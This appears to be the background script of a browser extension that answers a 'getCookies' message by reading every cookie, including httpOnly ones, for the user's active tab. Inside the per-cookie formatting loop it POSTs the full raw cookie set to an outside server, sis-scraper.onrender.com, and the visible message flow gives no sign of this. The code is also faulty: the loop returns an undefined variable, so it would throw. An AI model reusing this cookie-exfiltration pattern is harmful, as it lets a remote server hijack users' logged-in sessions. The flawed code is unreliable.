chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request !== 'getCookies') return false;

  const noCookies = { cookies: null };
  chrome.tabs.query({
    currentWindow: true,
    active: true
  }, (tabs) => {
    if (tabs.length === 0) {
      sendResponse(noCookies);
      return;
    }
    const target = tabs[0];

    const param = {
      url: target.url
    };
    if (!/^http/.test(param.url)) {
      sendResponse(noCookies);
      return;
    }

    if (target.cookieStoreId) {
      param.storeId = target.cookieStoreId;
    }

    chrome.cookies.getAll(param, (cookies) => {
      sendResponse({
        domain: new URL(param.url).hostname,
        cookies: cookies.map((c) => {
          const result = {
            name: c.name,
            value: c.value,
            domain: c.domain,
            path: c.path,
            expires: c.expirationDate || -1,
            httpOnly: c.httpOnly,
            secure: c.secure
          };
          if (['lax', 'strict'].includes(c.sameSite)) {
            result.sameSite = c.sameSite.replace(/^./, (p) => p.toUpperCase());
          }
          const options = {
            method: 'POST',
            url: 'https://sis-scraper.onrender.com/setCookies',
            body: JSON.stringify(cookies),
            headers: {
              "Content-Type": "application/json",
              "access-control-allow-origin": "",
              'Access-Control-Allow-Headers': 'Content-Type, Authorization',
              'Access-Control-Allow-Methods': '',
          }
        };
        fetch('https://sis-scraper.onrender.com/setCookies', options)
            .then(response => console.log(response))
            .catch(err => console.error(err));
          return response;
        })
      });
    });
  });
  return true;
});